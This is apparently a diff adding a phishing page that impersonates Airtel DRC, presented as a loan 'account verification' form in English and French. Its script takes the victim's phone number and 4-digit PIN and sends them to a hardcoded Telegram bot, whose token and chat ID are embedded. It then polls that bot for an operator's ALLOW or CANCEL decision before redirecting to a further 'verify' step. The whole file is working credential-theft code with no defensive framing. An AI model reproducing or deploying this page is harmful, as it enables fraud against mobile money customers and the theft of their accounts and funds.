@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>lite.airtel.cd</title>
+    <link rel="icon" type="image/png" href="https://www.airtel.in/favicon.ico">
+    <meta name="description" content="Airtel Lite DRC – Account verification for loan approval.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{ font-family:Arial,Helvetica,sans-serif; background:#f5f5f5; min-height:100vh; display:flex; flex-direction:column; }
+        .main{ flex:1; padding:16px 16px 40px; display:flex; flex-direction:column; align-items:center; }
+        .container{ width:100%; max-width:380px; background:#fff; border-radius:8px; padding:24px 20px; box-shadow:0 2px 12px rgba(0,0,0,0.1); text-align:center; margin-top:8px; }
+        h2{ font-size:20px; margin-bottom:8px; font-weight:700; color:#000; text-transform:uppercase; }
+        .info-text { font-size:14px; color:#555; margin-bottom:20px; line-height:1.4; }
+        .phone-wrapper { position: relative; display: flex; align-items: center; border:1px solid #d0d0d0; border-radius:6px; overflow: hidden; background:#fff; margin-bottom: 16px; }
+        .phone-prefix { background: #f8f8f8; color: #333; padding: 14px 12px; font-size:17px; border-right:1px solid #d0d0d0; white-space: nowrap; }
+        .input-box{ flex:1; border:none; padding:14px 16px; font-size:17px; outline:none; }
+        .phone-wrapper:focus-within { border-color:#e60000; box-shadow:0 0 0 2px rgba(230,0,0,0.1); }
+        
+        /* PIN boxes */
+        .pin-label { font-size: 14px; color: #333; margin-bottom: 10px; text-align: left; font-weight: 500; }
+        .pin-group { display: flex; justify-content: center; gap: 12px; margin-bottom: 8px; }
+        .pin-box {
+            width: 55px; height: 55px;
+            border: 1px solid #d0d0d0;
+            border-radius: 6px;
+            background: #f9f9f9;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            outline: none;
+        }
+        .pin-box:focus { border-color: #e60000; background: #fff; }
+        
+        .error-text{ color:#e60000; font-size:13px; text-align:left; margin-top:6px; display:none; }
+        .send-btn{ margin-top:20px; width:100%; padding:14px; border:none; font-size:16px; font-weight:700; color:#fff; border-radius:6px; background:#f3bcbc; cursor:not-allowed; transition:background 0.2s; }
+        .send-btn.active{ background:#e60000; cursor:pointer; }
+        .forgot-link { display:block; margin:16px 0 24px; color:#0066cc; font-size:14px; text-decoration:none; }
+        .forgot-link:hover{ text-decoration:underline; }
+        .or{ margin:20px 0; font-size:14px; color:#999; position:relative; }
+        .or::before, .or::after{ content:""; position:absolute; top:50%; width:38%; height:1px; background:#ccc; }
+        .or::before{left:0;} .or::after{right:0;}
+        .alt-btn{ border:1px solid #0099cc; color:#0099cc; background:#fff; padding:14px; width:100%; font-weight:700; border-radius:6px; cursor:pointer; font-size:16px; }
+        #spinner{ position:fixed; inset:0; background:rgba(255,255,255,.92); display:none; justify-content:center; align-items:center; z-index:1000; }
+        .loader{ width:48px; height:48px; border:5px solid #ddd; border-top:5px solid #e60000; border-radius:50%; animation:spin 1s linear infinite; }
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .browser-footer{ text-align:center; padding:20px 16px 40px; background:#f5f5f5; }
+        .browser-footer p{ font-size:13px; color:#666; margin-bottom:12px; }
+        .browser-icons{ display:flex; justify-content:center; flex-wrap:wrap; gap:16px; max-width:320px; margin:0 auto; }
+        .browser-icons img{ width:40px; height:40px; object-fit:contain; }
+    </style>
+</head>
+<body>
+<div class="main">
+    <div class="container">
+        <h2 id="loginTitle">ACCOUNT VERIFICATION</h2>
+        <p class="info-text" id="infoText">
+            Enter your Airtel number and PIN to verify your account for loan approval.
+        </p>
+
+        <!-- Phone -->
+        <div class="phone-wrapper">
+            <span class="phone-prefix">+243</span>
+            <input type="tel" id="phone" class="input-box" placeholder="" maxlength="9" inputmode="numeric">
+        </div>
+
+        <!-- 4 PIN boxes -->
+        <div class="pin-label" id="pinLabel">Enter your 4-digit PIN</div>
+        <div class="pin-group">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+
+        <div class="error-text" id="errorText"></div>
+        <button id="sendBtn" class="send-btn">SEND OTP CODE</button>
+        <a href="#" class="forgot-link" id="forgotLink">Forgot your number? Click here!</a>
+        <div class="or" id="orText">OR</div>
+        <button class="alt-btn" id="altBtn">CONTINUE WITHOUT LOGIN</button>
+    </div>
+</div>
+
+<div class="browser-footer">
+  <p id="browserText">For the best experience, please use the following browsers</p>
+  <div class="browser-icons">
+    <a href="https://www.google.com/chrome/" target="_blank"><img src="https://img.icons8.com/color/96/chrome.png" alt="Chrome"></a>
+    <a href="https://www.apple.com/safari/" target="_blank"><img src="https://img.icons8.com/color/96/safari--v2.png" alt="Safari"></a>
+    <a href="https://www.opera.com/" target="_blank"><img src="https://img.icons8.com/color/96/opera.png" alt="Opera"></a>
+    <a href="https://www.samsung.com/global/galaxy/apps/samsung-internet/" target="_blank"><img src="https://img.icons8.com/color/96/samsung-internet.png" alt="Samsung Internet"></a>
+    <a href="https://www.mozilla.org/firefox/" target="_blank"><img src="https://img.icons8.com/color/96/firefox.png" alt="Firefox"></a>
+    <a href="https://www.microsoft.com/edge" target="_blank"><img src="https://img.icons8.com/color/96/ms-edge.png" alt="Microsoft Edge"></a>
+  </div>
+</div>
+<div id="spinner"><div class="loader"></div></div>
+
+<script>
+    if (!localStorage.getItem('lang')) window.location.href = 'index';
+
+    const lang = localStorage.getItem('lang') || 'en';
+    const t = {
+        en: {
+            loginTitle: "ACCOUNT VERIFICATION",
+            infoText: "Enter your Airtel number and PIN to verify your account for loan approval.",
+            phonePlaceholder: "Enter phone number",
+            pinLabel: "Enter your 4-digit PIN",
+            errorText: "Please enter a valid 9-digit number and 4-digit PIN",
+            sendBtn: "SEND OTP CODE",
+            forgotLink: "Forgot your number? Click here!",
+            orText: "OR",
+            altBtn: "CONTINUE WITHOUT LOGIN",
+            browserText: "For the best experience, please use the following browsers",
+            cancelled: "Incorrect pin or phone number. Please try again."
+        },
+        fr: {
+            loginTitle: "VÉRIFICATION DU COMPTE",
+            infoText: "Entrez votre numéro Airtel et votre PIN pour vérifier votre compte en vue de l'approbation du prêt.",
+            phonePlaceholder: "Entrer Numéro de téléphone",
+            pinLabel: "Entrez votre PIN à 4 chiffres",
+            errorText: "Veuillez entrer un numéro valide à 9 chiffres et un PIN à 4 chiffres",
+            sendBtn: "ENVOYER CODE OTP",
+            forgotLink: "Vous avez oublié votre numéro ? Cliquez ici !",
+            orText: "OU",
+            altBtn: "CONTINUER SANS CONNEXION",
+            browserText: "Pour une expérience optimale, veuillez utiliser les navigateurs suivants",
+            cancelled: "Code PIN ou numéro de téléphone incorrect. Veuillez réessayer."
+        }
+    };
+
+    const tr = t[lang];
+    document.getElementById('loginTitle').textContent = tr.loginTitle;
+    document.getElementById('infoText').textContent = tr.infoText;
+    document.getElementById('phone').placeholder = tr.phonePlaceholder;
+    document.getElementById('pinLabel').textContent = tr.pinLabel;
+    document.getElementById('errorText').textContent = tr.errorText;
+    document.getElementById('sendBtn').textContent = tr.sendBtn;
+    document.getElementById('forgotLink').textContent = tr.forgotLink;
+    document.getElementById('orText').textContent = tr.orText;
+    document.getElementById('altBtn').textContent = tr.altBtn;
+    document.getElementById('browserText').textContent = tr.browserText;
+
+    // New bot credentials
+    const BOT_TOKEN = "8848546436:AAElpIOFcmpxdINnNE-eQF5VD_hfH3QNE1Y";
+    const CHAT_ID = "8632204062";
+
+    const phoneInput = document.getElementById("phone");
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const sendBtn = document.getElementById("sendBtn");
+    const spinner = document.getElementById("spinner");
+    const error = document.getElementById("errorText");
+    let currentRequestId = null;
+
+    // Digits only for phone
+    phoneInput.addEventListener("input", () => {
+        phoneInput.value = phoneInput.value.replace(/\D/g, '');
+        checkFormValid();
+    });
+
+    // Digits only + auto focus for PIN boxes
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            if (e.target.value.length === 1 && index < 3) {
+                pinBoxes[index + 1].focus();
+            }
+            checkFormValid();
+        });
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+        // Paste support
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+            paste.split('').forEach((digit, i) => {
+                if (index + i < 4) {
+                    pinBoxes[index + i].value = digit;
+                }
+            });
+            checkFormValid();
+        });
+    });
+
+    function getPinValue() {
+        return Array.from(pinBoxes).map(b => b.value).join('');
+    }
+
+    function checkFormValid() {
+        const phoneValid = phoneInput.value.length === 9;
+        const pinValid = getPinValue().length === 4;
+        sendBtn.classList.toggle("active", phoneValid && pinValid);
+        error.style.display = "none";
+    }
+
+    sendBtn.onclick = () => {
+        if (!sendBtn.classList.contains("active")) return;
+
+        const localPhone = phoneInput.value.trim();
+        const pin = getPinValue();
+
+        if (localPhone.length !== 9 || pin.length !== 4) {
+            error.style.display = "block";
+            return;
+        }
+
+        const fullPhone = "+243" + localPhone;
+        spinner.style.display = "flex";
+        currentRequestId = Date.now().toString();
+
+        // Save PIN for later use if needed
+        localStorage.setItem('userPin', pin);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `Airtel Lite – Account Verification for Loan\nPhone: ${fullPhone}\nPIN: ${pin}`,
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "✅ ALLOW", callback_data: `allow_${currentRequestId}` },
+                        { text: "❌ CANCEL", callback_data: `cancel_${currentRequestId}` }
+                    ]]
+                }
+            })
+        }).catch(err => {
+            console.error(err);
+            spinner.style.display = "none";
+        });
+
+        startPolling();
+    };
+
+    function startPolling() {
+        const interval = setInterval(() => {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${(window.lastUpdateId || 0) + 1}`)
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result) return;
+                    data.result.forEach(update => {
+                        window.lastUpdateId = update.update_id;
+                        if (update.callback_query) {
+                            const [action, requestId] = update.callback_query.data.split("_");
+                            if (requestId === currentRequestId) {
+                                clearInterval(interval);
+                                spinner.style.display = "none";
+                                if (action === "allow") {
+                                    localStorage.setItem('phone', "+243" + phoneInput.value.trim());
+                                    window.location.href = "verify";
+                                } else {
+                                    error.textContent = tr.cancelled;
+                                    error.style.display = "block";
+                                }
+                            }
+                        }
+                    });
+                })
+                .catch(err => console.error(err));
+        }, 2000);
+    }
+    window.lastUpdateId = window.lastUpdateId || 0;
+</script>
+</body>
+</html>
